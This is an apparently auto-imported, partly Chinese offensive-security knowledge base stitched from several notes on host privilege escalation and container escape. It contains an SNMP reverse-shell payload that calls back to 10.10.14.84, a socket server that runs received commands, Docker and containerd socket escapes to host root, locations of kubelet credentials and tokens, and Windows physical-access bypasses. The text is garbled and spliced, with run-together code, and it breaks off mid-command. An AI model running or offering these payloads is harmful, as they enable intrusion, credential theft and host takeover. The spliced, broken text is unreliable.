And maintain 持久化 on the host. For further details check the post https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And - 持久化 /. This is just a sumary: 利用 Overview: An 利用 targeting the Splunk Universal Forwarder Agent (UF) allows attackers with the agent 密码 to execute arbitrary code on systems running the agent, potentially compromising an entire network. The UF agent does not validate incoming connections or the authenticity of code, making it vulnerable to unauthorized code execution. Common 密码 acquisition methods include locating them in network directories, file shares, or internal documentation. Successful 利用 can lead to SYSTEM or root level access on compromised hosts, data exfiltration, and further network infiltration. 利用 Execution: Potential for disabling logging to evade 检测. To turn this into a root shell, a simple named-pipe + nc pattern can be used: This class of bugs arises from trusting values derived from unprivileged client state (TIDs) and binding them to privileged signal handlers or logic. Harden by enforcing 凭据 on the socket, validating message formats, and decoupling privileged operations from externally supplied thread identifiers. # 命令 / 载荷 / 操作片段 # 1. Socket binding example with Python 12345678910111213141516171819import socketimport os, os.pathimport timefrom collections import dequeif os.path.exists("/tmp/socket_test.s"): os.remove("/tmp/socket_test.s")server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)server.bind("/tmp/socket_test.s")os.system("chmod o+w /tmp/socket_test.s")while True: server.listen(1) conn, addr = server.accept() datagram = conn.recv(1024) if datagram: print(datagram) os.system(datagram) conn.close() # 2. Useful for kernel 利用 triage. It helps determine which subsystems, mitigations, and optional kernel features are enabled without needing host package metadata. Reveals kernel ring buffer messages. Useful for host fingerprinting, crash analysis, and in some environments for leaking information helpful to kernel 利用. Valuable when readable because it exposes exported kernel symbol information and may help defeat address randomization assumptions during kernel 利用 development. Exposes a core-image-style view of system memory. The file is huge and awkward to use, but if it is meaningfully readable it indicates a badly exposed host memory surface. Extremely useful for reconstructing where the 容器 really lives on the host, which paths are overlay-backed, and whether a writable mount corresponds to host content or only to the 容器 layer. /sys/kernel/debug is often the most alarming finding in this group. If debugfs is mounted and readable or writable, expect a wide kernel-facing surface whose exact risk depends on the enabled debug nodes. /sys/class/thermal is mainly relevant for host stability and hardware interaction, not for neat shell-style escape. /var/lib/kubelet/pki may expose kubelet client certificates and other node-local 凭据 that can sometimes be reused against the API server or kubelet-facing TLS endpoints, depending on cluster design. /var/lib/kubelet/pods often contains projected service-account tokens and mounted Secrets for neighboring pods on the same node. /var/lib/kubelet/pod-resources/kubelet.sock is mainly a 侦察 surface, but a very useful one: it reveals which pods and containers currently own GPUs, hugepages, SR-IOV devices, and other scarce node-local resources. CVE-2024-23651, CVE-2024-23652, and CVE-2024-23653 in BuildKit, where malicious Dockerfiles, frontends, and RUN --mount flows could reintroduce host file access, deletion, or elevated privileges during builds. CVE-2024-1753 in Buildah and Podman build flows, where crafted bind mounts during build could expose / read-write. content: 来源路径： 02-知识点/主机提权与逃逸/SNMP RCE 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # SNMP RCE 技术笔记 [!summary] 提炼定位 面向 主机提权与逃逸 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 拿到低权限 shell、受限命令执行或本地文件访问后，围绕 SNMP RCE 技术笔记 找提升 / 逃逸路径。 优先枚举权限、文件能力、SUID/sudo、服务配置和可写路径。 # 中文提炼 核心目标是判断 SNMP RCE 技术笔记 是否能把当前本地能力转换为文件读写、命令执行、提权或逃逸。 优先关注：SNMP RCE、Extending Services with Additional Commands、Injecting Commands for Execution、Running the Injected Commands、Gaining Server Shell with SNMP；先确认用户、组、sudo/SUID/Capabilities、可写路径和服务上下文。 命令片段必须带权限上下文使用：普通用户、sudo、SUID、受限 shell、计划任务或服务账户的结果不同。 检测视角重点记录父子进程、命令行、写入路径、网络连接、权限位变化和清理步骤。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 SNMP RCE Extending Services with Additional Commands Injecting Commands for Execution Running the Injected Commands Gaining Server Shell with SNMP # 核心要点 SNMP can be exploited by an attacker if the administrator overlooks its default configuration on the device or server. By abusing SNMP community with write permissions (rwcommunity) on a Linux operating system, the attacker can execute commands on the server. To confirm the execution of the injected command, the snmpwalk command can be used to enumerate the SNMP service. The output will display the command and its associated details, including the absolute path: When the injected command is read, it is executed. This behavior is known as run-on-read() The execution of the command can be observed during the snmpwalk read. To gain control over the server and obtain a server shell, a python script developed by mxrch can be utilized from https://github.com/mxrch/snmp-shell.git. Alternatively, a 反弹 Shell can be manually created by injecting a specific command into SNMP. This command, triggered by the snmpwalk, establishes a 反弹 Shell connection to the attacker's machine, enabling control over the victim machine. Or a 反弹 Shell: # 命令 / 载荷 / 操作片段 # 1. Extending Services with Additional Commands 1234snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \'nsExtendStatus."evilcommand"' = createAndGo \'nsExtendCommand."evilcommand"' = /bin/echo \'nsExtendArgs."evilcommand"' = 'hello world' # 2. Injecting Commands for Execution 1snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects # 3. Gaining Server Shell with SNMP 1234sudo apt install snmp snmp-mibs-downloader rlwrap -ygit clone https://github.com/mxrch/snmp-shellcd snmp-shellsudo python3 -m pip install -r requirements.txt # 4. Gaining Server Shell with SNMP 1snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"' # 工具与参考入口 https://github.com/mxrch/snmp-shell.git https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/ # 检查清单 是否枚举内核、用户、组、sudo/SUID/Capabilities 是否检查可写路径和服务配置 是否验证命令上下文与副作用 是否记录提权前后差异 # 关联 主机提权与逃逸总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/主机提权与逃逸/SELinux 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # SELinux 技术笔记 [!summary] 提炼定位 面向 主机提权与逃逸 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 拿到低权限 shell、受限命令执行或本地文件访问后，围绕 SELinux 技术笔记 找提升 / 逃逸路径。 优先枚举权限、文件能力、SUID/sudo、服务配置和可写路径。 # 中文提炼 核心目标是判断 SELinux 技术笔记 是否能把当前本地能力转换为文件读写、命令执行、提权或逃逸。 优先关注：SELinux、Fast 枚举、Policy Analysis、Files, Relabeling, and High-Value Misconfigurations、Hidden Denials and Module Extraction；先确认用户、组、sudo/SUID/Capabilities、可写路径和服务上下文。 命令片段必须带权限上下文使用：普通用户、sudo、SUID、受限 shell、计划任务或服务账户的结果不同。 检测视角重点记录父子进程、命令行、写入路径、网络连接、权限位变化和清理步骤。 本页已沉淀 26 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 SELinux Fast 枚举 Policy Analysis Files, Relabeling, and High-Value Misconfigurations Hidden Denials and Module Extraction Audit Clues SELinux Users SELinux in Containers Overview AppArmor Vs SELinux Runtime Usage Misconfigurations Abuse Full Example: SELinux Disabled + Writable Host Mount Full Example: SELinux Disabled + Runtime Directory Checks Runtime Defaults # 核心要点 Policy decides whether one domain can read/write/execute/transition to the other If SELinux is enabled, enumerate it early because it can explain why common Linux privesc paths fail or why a privileged wrapper around a "harmless" SELinux tool is actually critical: SELinux is much easier to attack or 绕过 when you can answer two questions: If sudo -l contains entries like this, SELinux is part of the privilege boundary: runcon and newrole are not automatically exploitable, but if a privileged wrapper or a sudoers rule lets you select a better role/type, they become high-value escalation primitives. restorecon / setfiles: apply the policy/default label again restorecon / setfiles: reapplies those changes at scale relabel attacker-controlled files so a privileged service can read or execute them weaken a confined service enough that an existing local bug becomes exploitable SELinux often explains why a generic breakout writeup works immediately on one host but fails repeatedly on another even though the runtime flags look similar. The missing ingredient is frequently not a namespace or a capability at all, but a label boundary that stayed intact. On SELinux-capable hosts, losing labels around runtime state directories can also expose direct privilege-escalation paths: When reviewing a 容器 on an SELinux-capable platform, do not treat labeling as a secondary detail. In many cases it is one of the main reasons the host is not already compromised. # 命令 / 载荷 / 操作片段 # 1. SELinux 123user:role:type:levelsystem_u:system_r:httpd_t:s0unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 # 2. Fast 枚举 123456getenforcesestatusid -Zps -eZ | headcat /proc/self/attr/currentls -Zd / /root /home /tmp /etc /var/www 2>/dev/null # 3. Fast 枚举 12345678910111213# Installed policy modules and local customizationssemodule -lfull 2>/dev/nullsemanage fcontext -C -l 2>/dev/nullsemanage permissive -l 2>/dev/nullsemanage login -l 2>/dev/nullsemanage user -l 2>/dev/null# Labels that frequently reveal mistakes or unusual pathsfind / -context '*:default_t:*' -o -context '*:file_t:*' 2>/dev/null# Compare current label vs policy default for a pathmatchpathcon -V /path/of/interest 2>/dev/nullrestorecon -n -v /path/of/interest 2>/dev/null # 4. Policy Analysis 12345678910# Transition graph from the current domainsepolicy transition -s "$(id -Z | awk -F: '{print $3}')" 2>/dev/null# Search allow and type_transition rulessesearch -A -s staff_t 2>/dev/null | headsesearch --type_transition -s staff_t 2>/dev/null | head# Inspect policy componentsseinfo -t 2>/dev/null | headseinfo -r 2>/dev/null | head # 5. Policy Analysis 1linux_user ALL=(ALL) ROLE=webadm_r TYPE=webadm_t /bin/bash # 6. Policy Analysis 123sudo -lwhich newrole runconnewrole -l 2>/dev/null # 7. Files, Relabeling, and High-Value Misconfigurations 123grep -R . /etc/selinux/*/contexts/files/file_contexts.local 2>/dev/nullrestorecon -nvr / 2>/dev/null | head -n 50matchpathcon -V /etc/passwd /etc/shadow /usr/local/bin/* 2>/dev/null # 8. Files, Relabeling, and High-Value Misconfigurations 123grep -R . /etc/selinux/*/contexts/customizable_types 2>/dev/null | headrestorecon -n -v /path/of/interest 2>/dev/nullrestorecon -F -v /path/of/interest 2>/dev/null # 9. Files, Relabeling, and High-Value Misconfigurations 12which semanage restorecon chcon setfiles semodule audit2allow runcon newrole setsebool load_policy 2>/dev/nullgetcap -r / 2>/dev/null | grep -E 'cap_mac_admin|cap_mac_override' # 10. Files, Relabeling, and High-Value Misconfigurations 123456# If sudo exposes semanage/restorecon, think in terms of policy abusesudo -l | grep -E 'semanage|restorecon|setfiles|semodule|runcon|newrole|setsebool|load_policy'# Look for places where local file-context overrides may mattersemanage fcontext -C -l 2>/dev/nullrestorecon -n -v /usr/local/bin /opt /srv /var/www 2>/dev/nul

content: 来源路径： 02-知识点/主机提权与逃逸/Runtime API And Daemon Exposure 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Runtime API And Daemon Exposure 技术笔记 [!summary] 提炼定位 面向 主机提权与逃逸 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 拿到低权限 shell、受限命令执行或本地文件访问后，围绕 Runtime API And Daemon Exposure 技术笔记 找提升 / 逃逸路径。 优先枚举权限、文件能力、SUID/sudo、服务配置和可写路径。 # 中文提炼 核心目标是判断 Runtime API And Daemon Exposure 技术笔记 是否能把当前本地能力转换为文件读写、命令执行、提权或逃逸。 优先关注：Runtime API And Daemon Exposure、Overview、Daemon Access Models、Secure Remote Access、Abuse；先确认用户、组、sudo/SUID/Capabilities、可写路径和服务上下文。 命令片段必须带权限上下文使用：普通用户、sudo、SUID、受限 shell、计划任务或服务账户的结果不同。 检测视角重点记录父子进程、命令行、写入路径、网络连接、权限位变化和清理步骤。 本页已沉淀 12 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Runtime API And Daemon Exposure Overview Daemon Access Models Secure Remote Access Abuse When No Client Is Installed Full Example: Docker Socket To Host Root Full Example: Docker Socket To Host Namespaces Full Example: containerd Socket BuildKit Socket Kubelet API Over TCP Checks Runtime Defaults # 核心要点 The historical Docker configuration pattern looked like: These commands are useful because they distinguish between a dead path, a mounted but inaccessible socket, and a live privileged API. If the client succeeds, the next question is whether the API can launch a new 容器 with a host bind mount or host namespace sharing. If Docker.sock is reachable, the classical escape is to start a new 容器 that mounts the host root filesystem and then chroot into it: This provides direct host-root execution through the Docker daemon. The impact is not limited to file reads. Once inside the new 容器，the attacker can alter host files, harvest 凭据，implant 持久化，or start additional privileged workloads. If the attacker prefers namespace entry instead of filesystem-only access: This path reaches the host by asking the runtime to create a new 容器 with explicit host-namespace exposure rather than by exploiting the current one. Environment variables such as Docker HOST often reveal that the workload was intentionally designed to talk to the host runtime. # 命令 / 载荷 / 操作片段 # 1. Daemon Access Models 12345678/var/run/docker.sock/run/docker.sock/run/containerd/containerd.sock/var/run/crio/crio.sock/run/podman/podman.sock/var/run/kubelet.sock/run/buildkit/buildkitd.sock/run/firecracker-containerd.sock # 2. Secure Remote Access 12DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"sudo service docker restart # 3. Abuse 123456789find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/nullss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/nulldocker -H unix:///var/run/docker.sock version 2>/dev/nullpodman --url unix:///run/podman/podman.sock info 2>/dev/nullnerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/nullctr --address /run/containerd/containerd.sock images ls 2>/dev/nullcrictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/nullcrictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/nullbuildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null # 4. When No Client Is Installed 123456789curl --unix-socket /var/run/docker.sock http://localhost/_pingcurl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/jsoncurl --unix-socket /var/run/docker.sock \ -H 'Content-Type: application/json' \ -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \ -X POST http://localhost/v1.54/containers/createcurl --unix-socket /run/podman/podman.sock http://d/_pingcurl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json # 5. Full Example: Docker Socket To Host Root 12docker -H unix:///var/run/docker.sock imagesdocker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash # 6. Full Example: Docker Socket To Host Namespaces 12docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bashnsenter --target 1 --mount --uts --ipc --net --pid -- bash # 7. Full Example: containerd Socket 123ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latestctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/shchroot /host /bin/sh # 8. Full Example: containerd Socket 123nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \ --privileged --pid=host -v /:/host docker.io/library/alpine:latest shchroot /host /bin/sh # 9. BuildKit Socket 12buildctl --addr unix:///run/buildkit/buildkitd.sock debug workersbuildctl --addr unix:///run/buildkit/buildkitd.sock du # 10. BuildKit Socket 1234567buildctl --addr unix:///run/buildkit/buildkitd.sock build \ --frontend dockerfile.v0 \ --

This code can be used on websites like https://bios-pw.org to potentially retrieve a usable 密码. Changing system binaries like ** sethc.exe ** or ** Utilman.exe ** with a copy of ** cmd.exe ** can provide a command prompt with system privileges. 工具 such as chntpw can be used to edit the SAM file of a Windows installation, allowing 密码 changes. Kon-Boot is a tool that facilitates logging into Windows systems without knowing the 密码 by temporarily modifying the Windows kernel or UEFI. More information can be found at https://www.raymond.cc. Pressing Shift after the Windows banner can 绕过 autologon. Devices like Rubber Ducky and Teensyduino serve as platforms for creating bad USB devices, capable of executing predefined 载荷 when connected to a target computer. Administrator privileges allow for the creation of copies of sensitive files, including the SAM file, through PowerShell. Stored 载荷 are tagged per OS, keyboard layouts are switched on the fly, and VID/PID strings can be altered to mimic known peripherals. AutoExec rules bind one or more 载荷 to fire immediately after USB 枚举. The implant performs lightweight OS fingerprinting and selects the matching script.
